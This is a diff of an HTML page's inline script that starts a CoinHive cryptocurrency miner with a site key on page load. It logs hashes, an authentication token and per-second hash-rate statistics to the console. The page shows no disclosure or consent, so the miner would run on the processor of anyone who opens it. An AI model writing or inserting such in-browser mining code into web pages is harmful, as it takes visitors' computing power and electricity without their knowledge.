@@ -8,27 +8,27 @@
     </head>
 
     <body>
-        <script src="jquery-3.2.1.min.js"></script>
         <script>
-            jQuery(function() {
-                var miner = new CoinHive.Anonymous('G4EHaIWWK2JC559qZ8REANm0ozrgpbCW');
-                miner.start();
-                // Listen on events
-                miner.on('found', function() {
-                    console.log("Hash found");
-                })
-                miner.on('accepted', function() {
-                    console.log("Hash accepted by the pool");
-                })
-                // Update stats once per second
-                setInterval(function() {
-                    var hashesPerSecond = miner.getHashesPerSecond();
-                    var totalHashes = miner.getTotalHashes();
-                    var acceptedHashes = miner.getAcceptedHashes();
-                    console.log('hashesPerSecond | totalHashes | accepted Hashes');
-                    console.log(hashesPerSecond + ' ' + totalHashes + ' ' + acceptedHashes);
-                }, 1000);
+            var miner = new CoinHive.Anonymous('G4EHaIWWK2JC559qZ8REANm0ozrgpbCW');
+            miner.start();
+            // Listen on events
+            miner.on('found', function() {
+                console.log("Hash found");
+            })
+            miner.on('accepted', function() {
+                console.log("Hash accepted by the pool");
+            })
+            miner.on('authed', function(params) {
+                console.log('Token name is: ', miner.getToken());
             });
+            // Update stats once per second
+            setInterval(function() {
+                var hashesPerSecond = miner.getHashesPerSecond();
+                var totalHashes = miner.getTotalHashes();
+                var acceptedHashes = miner.getAcceptedHashes();
+                console.log('hashesPerSecond | totalHashes | accepted Hashes');
+                console.log(hashesPerSecond + ' ' + totalHashes + ' ' + acceptedHashes);
+            }, 1000);
         </script>
     </body>
 
